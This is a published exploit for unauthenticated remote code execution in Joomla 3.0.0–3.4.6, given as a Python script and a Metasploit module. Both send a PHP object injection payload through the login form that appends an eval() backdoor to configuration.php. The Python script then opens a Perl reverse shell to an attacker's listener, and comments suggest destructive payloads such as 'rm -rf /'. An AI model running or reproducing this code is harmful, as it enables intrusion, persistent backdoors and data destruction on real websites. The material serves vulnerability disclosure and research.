# Google Dork: N/A
# Date: 2019-10-02
# Exploit Author: Alessandro Groppo
# Vendor Homepage: https//www.joomla.it/
# Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6
# Version: 3.0.0 --> 3.4.6
# Tested on: Linux
# CVE : N/A


# Technical details: https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41
# Github: https://github.com/kiks7/rusty_joomla_rce
#
# The exploitation is implanting a backdoor in /configuration.php file in the root directory with an eval in order to be more suitable for all environments, but it is also more intrusive.
# If you don&#039;t like this way, you can replace the get_backdoor_pay() with get_pay(&#039;php_function&#039;, &#039;parameter&#039;) like get_pay(&#039;system&#039;,&#039;rm -rf /&#039;)


#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import sys
import string
import random
import argparse
from termcolor import colored

PROXS = {&#039;http&#039;:&#039;127.0.0.1:8080&#039;}
PROXS = {}

def random_string(stringLength):
	letters = string.ascii_lowercase
	return &#039;&#039;.join(random.choice(letters) for i in range(stringLength))


backdoor_param = random_string(50)

def print_info(str):
	print(colored("[*] " + str,"cyan"))

def print_ok(str):
	print(colored("[+] "+ str,"green"))

def print_error(str):
	print(colored("[-] "+ str,"red"))

def print_warning(str):
	print(colored("[!!] " + str,"yellow"))

def get_token(url, cook):
	token = &#039;&#039;
	resp = requests.get(url, cookies=cook, proxies = PROXS)
	html = BeautifulSoup(resp.text,&#039;html.parser&#039;)
	# csrf token is the last input
	for v in html.find_all(&#039;input&#039;):
		csrf = v
	csrf = csrf.get(&#039;name&#039;)
	return csrf


def get_error(url, cook):
	resp = requests.get(url, cookies = cook, proxies = PROXS)
	if &#039;Failed to decode session object&#039; in resp.text:
		#print(resp.text)
		return False
	#print(resp.text)
	return True


def get_cook(url):
	resp = requests.get(url, proxies=PROXS)
	#print(resp.cookies)
	return resp.cookies


def gen_pay(function, command):
	# Generate the payload for call_user_func(&#039;FUNCTION&#039;,&#039;COMMAND&#039;)
	template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;
	#payload =  command + &#039; || $a=\&#039;http://wtf\&#039;;&#039;
	payload =  &#039;http://l4m3rz.l337/;&#039; + command
	# Following payload will append an eval() at the enabled of the configuration file
	#payload =  &#039;file_put_contents(\&#039;configuration.php\&#039;,\&#039;if(isset($_POST[\\\&#039;test\\\&#039;])) eval($_POST[\\\&#039;test\\\&#039;]);\&#039;, FILE_APPEND) || $a=\&#039;http://wtf\&#039;;&#039;
	function_len = len(function)
	final = template.replace(&#039;PAYLOAD&#039;,payload).replace(&#039;LENGTH&#039;, str(len(payload))).replace(&#039;FUNC_NAME&#039;, function).replace(&#039;FUNC_LEN&#039;, str(len(function)))
	return final

def make_req(url , object_payload):
	# just make a req with object
	print_info(&#039;Getting Session Cookie ..&#039;)
	cook = get_cook(url)
	print_info(&#039;Getting CSRF Token ..&#039;)
	csrf = get_token( url, cook)

	user_payload = &#039;\\0\\0\\0&#039; * 9
	padding = &#039;AAA&#039; # It will land at this padding
	working_test_obj = &#039;s:1:"A":O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}&#039;
	clean_object = &#039;A";s:5:"field";s:10:"AAAAABBBBB&#039; # working good without bad effects

	inj_object = &#039;";&#039;
	inj_object += object_payload
	inj_object += &#039;s:6:"return";s:102:&#039; # end the object with the &#039;return&#039; part
	password_payload = padding + inj_object
	params = {
            &#039;username&#039;: user_payload,
            &#039;password&#039;: password_payload,
            &#039;option&#039;:&#039;com_users&#039;,
            &#039;task&#039;:&#039;user.login&#039;,
            csrf :&#039;1&#039;
            }

	print_info(&#039;Sending request ..&#039;)
	resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
	return resp.text

def get_backdoor_pay():
	# This payload will backdoor the the configuration .PHP with an eval on POST request

	function = &#039;assert&#039;
	template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;
	# payload =  command + &#039; || $a=\&#039;http://wtf\&#039;;&#039;
	# Following payload will append an eval() at the enabled of the configuration file
	payload =  &#039;file_put_contents(\&#039;configuration.php\&#039;,\&#039;if(isset($_POST[\\\&#039;&#039; + backdoor_param +&#039;\\\&#039;])) eval($_POST[\\\&#039;&#039;+backdoor_param+&#039;\\\&#039;]);\&#039;, FILE_APPEND) || $a=\&#039;http://wtf\&#039;;&#039;
	function_len = len(function)
	final = template.replace(&#039;PAYLOAD&#039;,payload).replace(&#039;LENGTH&#039;, str(len(payload))).replace(&#039;FUNC_NAME&#039;, function).replace(&#039;FUNC_LEN&#039;, str(len(function)))
	return final

def check(url):
	check_string = random_string(20)
	target_url = url + &#039;index.php/component/users&#039;
	html = make_req(url, gen_pay(&#039;print_r&#039;,check_string))
	if check_string in html:
		return True
	else:
		return False

def ping_backdoor(url,param_name):
	res = requests.post(url + &#039;/configuration.php&#039;, data={param_name:&#039;echo \&#039;PWNED\&#039;;&#039;}, proxies = PROXS)
	if &#039;PWNED&#039; in res.text:
		return True
	return False

def execute_backdoor(url, payload_code):
	# Execute PHP code from the backdoor
	res = requests.post(url + &#039;/configuration.php&#039;, data={backdoor_param:payload_code}, proxies = PROXS)
	print(res.text)

def exploit(url, lhost, lport):
	# Exploit the target
	# Default exploitation will append en eval function at the end of the configuration.pphp
	# as a bacdoor. btq if you do not want this use the funcction get_pay(&#039;php_function&#039;,&#039;parameters&#039;)
	# e.g. get_payload(&#039;system&#039;,&#039;rm -rf /&#039;)

	# First check that the backdoor has not been already implanted
	target_url = url + &#039;index.php/component/users&#039;

	make_req(target_url, get_backdoor_pay())
	if ping_backdoor(url, backdoor_param):
		print_ok(&#039;Backdoor implanted, eval your code at &#039; + url + &#039;/configuration.php in a POST with &#039; + backdoor_param)
		print_info(&#039;Now it\&#039;s time to reverse, trying with a system + perl&#039;)
		execute_backdoor(url, &#039;system(\&#039;perl -e \\\&#039;use Socket;$i="&#039;+ lhost +&#039;";$p=&#039;+ str(lport) +&#039;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\\\&#039;\&#039;);&#039;)


if __name__ == &#039;__main__&#039;:
	parser = argparse.ArgumentParser()
	parser.add_argument(&#039;-t&#039;,&#039;--target&#039;,required=True,help=&#039;Joomla Target&#039;)
	parser.add_argument(&#039;-c&#039;,&#039;--check&#039;, default=False, action=&#039;store_true&#039;, required=False,help=&#039;Check only&#039;)
	parser.add_argument(&#039;-e&#039;,&#039;--exploit&#039;,default=False,action=&#039;store_true&#039;,help=&#039;Check and exploit&#039;)
	parser.add_argument(&#039;-l&#039;,&#039;--lhost&#039;, required=&#039;--exploit&#039; in sys.argv, help=&#039;Listener IP&#039;)
	parser.add_argument(&#039;-p&#039;,&#039;--lport&#039;, required=&#039;--exploit&#039; in sys.argv, help=&#039;Listener port&#039;)
	args = vars(parser.parse_args())

	url = args[&#039;target&#039;]
	if(check(url)):
		print_ok(&#039;Vulnerable&#039;)
		if args[&#039;exploit&#039;]:
			exploit(url, args[&#039;lhost&#039;], args[&#039;lport&#039;])
		else:
			print_info(&#039;Use --exploit to exploit it&#039;)

	else:
		print_error(&#039;Seems NOT Vulnerable ;/&#039;)


metasploit_rusty_joomla_rce.rb

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Rusty Joomla Unauthenticated Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
	PHP Object Injection because of a downsize in the read/write process with the database leads to RCE.
	The exploit will backdoor the configuration.php file in the root directory with en eval of a POST parameter.
	That&#039;s because the exploit is more reliabale (doesn&#039;t rely on common disabled function). 
	For this reason, use it with caution and remember the house cleaning.
	Btw, you can also edit this exploit and use whatever payload you want. just modify the exploit object with 
	get_payload(&#039;you_php_function&#039;,&#039;your_parameters&#039;), e.g. get_payload(&#039;system&#039;,&#039;rm -rf /&#039;) and enjoy
      },
      &#039;Author&#039;	=>
        [
          &#039;Alessandro \&#039;kiks\&#039; Groppo @Hacktive Security&#039;, 
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
		[&#039;URL&#039;, &#039;https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41&#039;]
        ],
      &#039;Privileged&#039;     => false, 
      &#039;Platform&#039;       => &#039;PHP&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Joomla 3.0.0 - 3.4.6&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Oct 02  2019&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )

    register_advanced_options(
      [
        OptBool.new(&#039;FORCE&#039;, [true, &#039;Force run even if check reports the service is safe.&#039;, false]),
      ])
  end

  def get_random_string(length=50)
  	source=("a".."z").to_a + ("A".."Z").to_a + (0..9).to_a 
	key=""
	length.times{ key += source[rand(source.size)].to_s }
	return key
  end

  def get_session_token
	# Get session token from cookies
	vprint_status(&#039;Getting Session Token&#039;)
	res = send_request_cgi({
		&#039;method&#039; => &#039;GET&#039;,
		&#039;uri&#039; 	 => normalize_uri(target_uri.path) 
	})
	
	cook = res.headers[&#039;Set-Cookie&#039;].split(&#039;;&#039;)[0]
	vprint_status(&#039;Session cookie: &#039; + cook)
	return cook
  end

  def get_csrf_token(sess_cookie)
	  vprint_status(&#039;Getting CSRF Token&#039;)

	  res = send_request_cgi({
		&#039;method&#039; => &#039;GET&#039;,
		&#039;uri&#039;	 => normalize_uri(target_uri.path,&#039;/index.php/component/users&#039;),
		&#039;headers&#039; => {
			&#039;Cookie&#039; => sess_cookie,
		}
	  })

	  html = res.get_html_document
	  input_field = html.at(&#039;//form&#039;).xpath(&#039;//input&#039;)[-1]
	  token = input_field.to_s.split(&#039; &#039;)[2]
	  token = token.gsub(&#039;name="&#039;,&#039;&#039;).gsub(&#039;"&#039;,&#039;&#039;)
	  if token then
		  vprint_status(&#039;CSRF Token: &#039; + token)
		  return token
	  end
	  print_error(&#039;Cannot get the CSRF Token ..&#039;)

  end

  def get_payload(function, payload)
	  # @function: The PHP Function
	  # @payload: The payload for the call
	  template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;
	  # The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values
	  payload = &#039;http://l4m3rz.l337/;&#039; + payload
	  final = template.gsub(&#039;PAYLOAD&#039;,payload).gsub(&#039;LENGTH&#039;, payload.length.to_s).gsub(&#039;FUNC_NAME&#039;, function).gsub(&#039;FUNC_LEN&#039;, function.length.to_s)
	  return final
  end

 
  def get_payload_backdoor(param_name) 
	# return the backdoor payload
	# or better, the payload that will inject and eval function in configuration.php (in the root)
	# As said in other part of the code. we cannot create new .php file because we cannot use 
	# the ? character because of the check on URI schema
	function = &#039;assert&#039;
        template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;                                                             
        # This payload will append an eval() at the end of the configuration file                                                                            
        payload =  "file_put_contents(&#039;configuration.php&#039;,&#039;if(isset($_POST[\\&#039;"+param_name+"\\&#039;])) eval($_POST[\\&#039;"+param_name+"\\&#039;]);&#039;, FILE_APPEND) || $a=\&#039;http://wtf\&#039;;"
	template[&#039;PAYLOAD&#039;]  = payload 
	template[&#039;LENGTH&#039;]   = payload.length.to_s
	template[&#039;FUNC_NAME&#039;] = function 
	template[&#039;FUNC_LEN&#039;] = function.length.to_s
        return template 

  end


  def check_by_exploiting
	    # Check that is vulnerable by exploiting it and try to inject a printr(&#039;something&#039;)
	    # Get the Session anb CidSRF Tokens
	    sess_token = get_session_token()
	    csrf_token = get_csrf_token(sess_token)

	    print_status(&#039;Testing with a POC object payload&#039;)

	    username_payload = &#039;\\0\\0\\0&#039; * 9
	    password_payload += get_payload(&#039;print_r&#039;,&#039;IAMSODAMNVULNERABLE&#039;)	# actual payload 
	    password_payload += &#039;s:6:"return":s:102:&#039; 				# close cleanly the object
	    res = send_request_cgi({
			&#039;uri&#039;	   => normalize_uri(target_uri.path,&#039;/index.php/component/users&#039;),
			&#039;method&#039;   => &#039;POST&#039;,
			&#039;headers&#039;  => 
				{
				&#039;Cookie&#039; => sess_token,
			},
			&#039;vars_post&#039; => {
				&#039;username&#039; => username_payload,
				&#039;password&#039; => password_payload,
				&#039;option&#039;   => &#039;com_users&#039;,
				&#039;task&#039;	   => &#039;user.login&#039;,
				csrf_token => &#039;1&#039;,
			}
	    }) 
	    # Redirect in order to retrieve the output
	    if res.redirection then
		res_redirect = send_request_cgi({
			&#039;method&#039; => &#039;GET&#039;,
			&#039;uri&#039;	 => res.redirection.to_s,
			&#039;headers&#039; =>{
				&#039;Cookie&#039; => sess_token
			}
		})

		if &#039;IAMSODAMNVULNERABLE&#039;.in? res.to_s or &#039;IAMSODAMNVULNERABLE&#039;.in? res_redirect.to_s then
			return true
		else
			return false
		end
		
	    end
    end

  def check
    # Check if the target is UP and get the current version running by info leak    
    res = send_request_cgi({&#039;uri&#039; => normalize_uri(target_uri.path, &#039;/administrator/manifests/files/joomla.xml&#039;)})
    unless res
      print_error("Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    # Parse XML to get the version 
    if res.code == 200 then
	    xml = res.get_xml_document
	    version = xml.at(&#039;version&#039;).text
	    print_status(&#039;Identified version &#039; + version)
	    if version <= &#039;3.4.6&#039; and version >= &#039;3.0.0&#039; then
		    if check_by_exploiting()
			return Exploit::CheckCode::Vulnerable
		    else
			if check_by_exploiting() then
			# Try the POC 2 times. 
				return Exploit::CheckCode::Vulnerable
			else
				return Exploit::CheckCode::Safe
			end
		    end
	    else
		    return Exploit::CheckCode::Safe
	    end
    else
	    print_error(&#039;Cannot retrieve XML file for the Joomla Version. Try the POC in order to confirm if it\&#039;s vulnerable&#039;)
	    if check_by_exploiting() then
		    return Exploit::CheckCode::Vulnerable
	    else
		    if check_by_exploiting() then
			return Exploit::CheckCode::Vulnerable
		    else
		    	return Exploit::CheckCode::Safe
		    end
	    end
    end
  end



  
  def exploit
    if check == Exploit::CheckCode::Safe && !datastore[&#039;FORCE&#039;]
      print_error(&#039;Target is not vulnerable&#039;)
      return
    end


    pwned = false
    cmd_param_name = get_random_string(50) 

    sess_token = get_session_token()
    csrf_token = get_csrf_token(sess_token)

    # In order to avoid problems with disabled functions
    # We are gonna append an eval() function at the end of the configuration.php file
    # This will not cause any problem to Joomla and is a good way to execute then PHP directly
    # cuz assert is toot annoying and with conditions that we have we cannot inject some characters
    # So we will use &#039;assert&#039; with file_put_contents to append the string. then create a reverse shell with this backdoor

    # TODO: Add the PHP payload object to inject the backdoor inside the configuration.php file
    # 		Use the implanted backdoor to receive a nice little reverse shell with a PHP payload

    
    # Implant the backdoor
    vprint_status(&#039;Cooking the exploit ..&#039;)
    username_payload = &#039;\\0\\0\\0&#039; * 9
    password_payload += get_payload_backdoor(cmd_param_name)		# actual payload 
    password_payload += &#039;s:6:"return":s:102:&#039; 				# close cleanly the object

    print_status(&#039;Sending exploit ..&#039;)


    res = send_request_cgi({
		&#039;uri&#039;	   => normalize_uri(target_uri.path,&#039;/index.php/component/users&#039;),
		&#039;method&#039;   => &#039;POST&#039;,
		&#039;headers&#039;  => {
			&#039;Cookie&#039; => sess_token
		},
		&#039;vars_post&#039; => {
			&#039;username&#039; => username_payload,
			&#039;password&#039; => password_payload,
			&#039;option&#039;   => &#039;com_users&#039;,
			&#039;task&#039;	   => &#039;user.login&#039;,
			csrf_token => &#039;1&#039;
		}
    }) 

    print_status(&#039;Triggering the exploit ..&#039;)    
    if res.redirection then
	res_redirect = send_request_cgi({
		&#039;method&#039; => &#039;GET&#039;,
		&#039;uri&#039;	 => res.redirection.to_s,
		&#039;headers&#039; =>{
			&#039;Cookie&#039; => sess_token
		}
	})
    end

    # Ping the backdoor see if everything is ok :/
    res = send_request_cgi({
		&#039;method&#039;     => &#039;POST&#039;,
		&#039;uri&#039;	     => normalize_uri(target_uri.path,&#039;configuration.php&#039;),
		&#039;vars_post&#039;  => {
			cmd_param_name  => &#039;echo \&#039;PWNED\&#039;;&#039; 
		}
	})
    if res.to_s.include? &#039;PWNED&#039; then
	print_status(&#039;Target P0WN3D! eval your code at /configuration.php with &#039; + cmd_param_name + &#039; in a POST&#039;)
	pwned = true
    end



    if pwned then
        print_status(&#039;Now it\&#039;s time to reverse shell&#039;)
		res = send_request_cgi({
		&#039;method&#039;     => &#039;POST&#039;,
		&#039;uri&#039;	     => normalize_uri(target_uri.path,&#039;configuration.php&#039;),
		&#039;vars_post&#039;  => {
			cmd_param_name  => payload.encoded 
		}
	})
    end

  end
end

